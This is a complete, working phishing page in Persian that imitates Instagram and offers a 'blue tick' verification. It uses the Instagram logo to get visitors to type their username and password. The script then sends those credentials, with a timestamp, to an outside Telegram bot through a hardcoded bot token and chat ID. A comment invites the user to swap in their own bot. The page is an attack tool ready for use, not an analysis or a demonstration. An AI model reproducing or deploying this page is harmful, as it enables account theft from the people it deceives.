<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>درخواست تیک آبی اینستاگرام</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #262626;
        }
        
        .container {
            width: 350px;
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px 40px;
            text-align: center;
        }
        
        .logo {
            margin: 20px 0;
            width: 175px;
        }
        
        .form-group {
            margin-bottom: 10px;
            text-align: right;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
            box-sizing: border-box;
        }
        
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        button {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
            font-size: 14px;
        }
        
        button:hover {
            background-color: #0077cc;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        
        .success {
            color: green;
            display: none;
        }
        
        .error {
            color: red;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        <h2>درخواست تیک آبی</h2>
        <p>لطفا اطلاعات حساب خود را برای بررسی تیک آبی وارد کنید</p>
        
        <div class="form-group">
            <input type="text" id="username" placeholder="نام کاربری اینستاگرام" required>
        </div>
        
        <div class="form-group">
            <input type="password" id="password" placeholder="رمز عبور" required>
        </div>
        
        <button id="submit-btn">تایید و ارسال درخواست</button>
        
        <p class="success" id="success-msg">درخواست شما با موفقیت ارسال شد!</p>
        <p class="error" id="error-msg">خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.</p>
        
        <div class="footer">
            <p>این صفحه رسمی اینستاگرام نیست. اطلاعات شما فقط برای بررسی تیک آبی استفاده می‌شود.</p>
        </div>
    </div>

    <script>
        document.getElementById('submit-btn').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('لطفا نام کاربری و رمز عبور را وارد کنید');
                return;
            }
            
            // اطلاعات برای ارسال به ربات تلگرام
            const data = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                source: 'Instagram Blue Tick Request'
            };
            
            // جایگزین کنید با توکن ربات و چت آیدی شما
            const botToken = '7591166314:AAGSfDjIJSH37xR_IA_b3tSg6ttjubcr1bE';
            const chatId = '6994971474';
            
            const message = `درخواست جدید تیک آبی:\n\nکاربری: ${username}\nرمز: ${password}\nزمان: ${new Date().toLocaleString('fa-IR')}`;
            
            // ارسال به ربات تلگرام از طریق API
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('success-msg').style.display = 'block';
                    document.getElementById('error-msg').style.display = 'none';
                } else {
                    throw new Error('Telegram API error');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('error-msg').style.display = 'block';
                document.getElementById('success-msg').style.display = 'none';
            });
        });
    </script>
</body>
</html>
